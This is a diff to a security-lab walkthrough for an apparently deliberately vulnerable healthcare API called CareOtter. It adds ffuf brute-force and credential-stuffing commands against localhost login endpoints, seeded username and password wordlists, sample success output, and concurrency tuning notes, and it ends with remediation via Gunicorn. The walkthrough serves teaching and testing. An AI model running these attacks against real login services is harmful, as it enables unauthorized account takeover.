@@ -206,18 +206,115 @@ This endpoint is **unauthenticated** and callable by anyone who can reach the Cl
 
 ### 1. Credential stuffing / brute force on login
 
+The login endpoints (`/api/auth/login`, `/api/auth/login/patient`, `/api/auth/login/caregiver`) enforce **no rate limiting, account lockout, or CAPTCHA**. This allows both credential-stuffing attacks (known user + password list) and horizontal brute-force attacks (password list against a single account).
+
+#### Prerequisites — prepare wordlists
+
 ```bash
-# Brute force a single account with a wordlist
-for pass in $(cat passwords.txt); do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST http://localhost:5002/api/auth/login \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"john_doe\",\"password\":\"$pass\"}")
-  echo "Tried '$pass' → HTTP $status"
-done
+# Known / seeded usernames in the lab
+cat > users.txt << 'EOF'
+admin
+john_doe
+care_john
+alice_g67
+genuinebob49
+EOF
+
+# Common weak passwords (tailor to your target wordlist)
+cat > passwords.txt << 'EOF'
+admin
+123456
+password
+johnny123
+CareOtter2026!
+Caregiver2026!
+Aliceisthebest!
+spongebob1
+EOF
 ```
 
-> **Expected:** The server accepts unlimited attempts with no delay, lockout, or CAPTCHA.
+---
+
+#### Option A — ffuf (recommended for REST APIs)
+
+`ffuf` is a fast web fuzzer written in Go. It supports **clusterbomb** mode to iterate every user against every password (Cartesian product), which is ideal for credential stuffing.
+
+> **⚠️ Important:** CareOtter runs on Flask's **development server** (Werkzeug). It is single-threaded with a very small connection backlog. If you launch ffuf with many threads (e.g. `-t 40`), Werkzeug will start rejecting connections with `Connection refused`. ffuf marks these as errors and skips those lines, so you may **miss the correct password** entirely. Always use **low concurrency** (`-t 1` or `-t 2`) against this target.
+
+##### Single-account brute force (one wordlist)
+
+```bash
+ffuf -u http://localhost:5002/api/auth/login/patient \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"john_doe","password":"FUZZ"}' \
+  -w passwords.txt \
+  -mr "token" \
+  -mc all \
+  -t 1
+```
+
+![[API-02-brute_force_john_doe.png]]
+##### Credential stuffing (two wordlists)
+
+```bash
+ffuf -u http://localhost:5002/api/auth/login \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"FUZZ","password":"FUZ2Z"}' \
+  -w users.txt:FUZZ \
+  -w passwords.txt:FUZ2Z \
+  -mode clusterbomb \
+  -mr "token" \
+  -mc all \
+  -t 1
+```
+
+**What the flags do:**
+| Flag | Meaning |
+|------|---------|
+| `-mode clusterbomb` | Test every user against every password (m × n combinations) |
+| `-mr "token"` | **Match** responses that contain the string `token` (success indicator) |
+| `-mc all` | Do not hide responses by HTTP status code — let `-mr` drive filtering |
+| `-t 1` | **Single thread** — required because Werkzeug's dev server drops connections under load |
+| `FUZZ` / `FUZ2Z` | Placeholders replaced by the first and second wordlist respectively |
+
+**Sample output on success:**
+```
+[Status: 200, Size: 312, Words: 12, Lines: 1]
+    * FUZZ: john_doe
+    * FUZ2Z: johnny123
+```
+
+---
+
+#### Lab Note — Werkzeug connection backlog limitation
+
+CareOtter uses Flask's built-in development server (`Werkzeug`), which is **not designed for concurrent load**. Its TCP listen backlog is very small (typically 128 or less), and it handles requests with a single-threaded or very small thread-pool model.
+
+When you launch ffuf/wfuzz with high concurrency (e.g. `-t 40`), the server starts rejecting connections with `Connection refused`. The fuzzer marks those lines as errors, skips them, and advances the counter — which explains the "jumping" behavior you observed (e.g. progress going from 800 to 20000 instantly). The requests that were skipped **never reached the application**, so if the correct password was among them, the attack will fail silently.
+
+**Mitigation:** Always use **single-threaded mode** (`-t 1` in ffuf, `-t 1` in wfuzz) or a sequential bash loop. The server can sustain ~300-500 req/s sequentially without errors, which is more than fast enough for lab-sized wordlists.
+
+**Verification:**
+
+```bash
+# This works — sequential, 0 errors, finds the password
+ffuf -w passwords.txt -u http://localhost:5002/api/auth/login/patient \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"username":"john_doe","password":"FUZZ"}' \
+  -mr "token" -mc all -t 1
+
+# This fails — high concurrency, ~95% connection errors, misses the password
+ffuf -w passwords.txt -u http://localhost:5002/api/auth/login/patient \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"username":"john_doe","password":"FUZZ"}' \
+  -mr "token" -mc all -t 40
+```
+
+> **Is this an API vulnerability?** No — it is not an intentional rate-limit. It is a side effect of running a **development server in production** (API8:2023 — Security Misconfiguration). The endpoint itself has no throttling logic.
+>
+> **Fix available:** The project now includes a `wsgi.py` entrypoint and a Gunicorn-based `Dockerfile` that replaces Werkzeug with a threaded production server. With Gunicorn (`--workers 1 --threads 4`), the API sustains 1000+ concurrent requests with **zero connection errors** and finds the correct password in under 2 seconds, even with high-concurrency fuzzers (`-t 40`).
 
 ### 2. Forge a JWT with the known secret
 
